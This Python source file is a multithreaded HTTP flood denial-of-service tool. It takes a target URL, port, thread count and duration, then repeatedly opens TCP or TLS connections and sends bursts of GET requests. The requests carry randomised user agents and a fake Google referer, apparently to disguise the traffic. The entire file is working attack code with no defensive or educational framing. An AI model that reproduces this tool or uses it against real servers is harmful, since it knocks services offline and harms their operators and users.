import argparse
from audioop import add
import random
import socket
import ssl
import threading
from urllib import request
from urllib.parse import urlparse
from weakref import ref
from wsgiref import headers
import time




def getUserAgents():
    global useragents 
    useragents=[]
    useragents.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    useragents.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    useragents.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    useragents.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    useragents.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    useragents.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    useragents.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")

    return useragents


def attack():
    path = "/"
    startTime = time.time()
    referer = "Referer: "+"google.com/search?q="+ "https://"+rootdomain + path + "\r\n"
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"

    packet = str(f"GET /{path} HTTP/1.1\nHost: {rootdomain}\n\n")

    packet = packet + referer + useragent
    while time.time() - startTime < attackTime:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if port == 443:
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s,server_hostname=str(rootdomain))
            s.connect((rootdomain,int(port)))
            s.settimeout(3)
            for i in range(100):
                s.send(str.encode(packet))
            s.close()
        except socket.error as e:
            print(e)



def main(): 
    global address,useragents,port,attackTime,rootdomain

    parser = argparse.ArgumentParser()
    parser.add_argument('-i', type=str, required=True)
    parser.add_argument('-thr', type=int, default=200)
    parser.add_argument('-p',type=int,required=True)
    parser.add_argument('-t',type=int, required=True)

    args = parser.parse_args()


    address = args.i 
    port = args.p 
    threads = args.thr
    attackTime = args.t

    rootdomain = str(urlparse(address).netloc)

    useragents = getUserAgents() 

    attackThreads = [] 

    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        attackThreads.append(thread)
    for i in range(threads):
        attackThreads[i].start()
        print("Started thread")
    for i in range(threads):
        attackThreads[i].join()

if __name__ == "__main__":
    main()
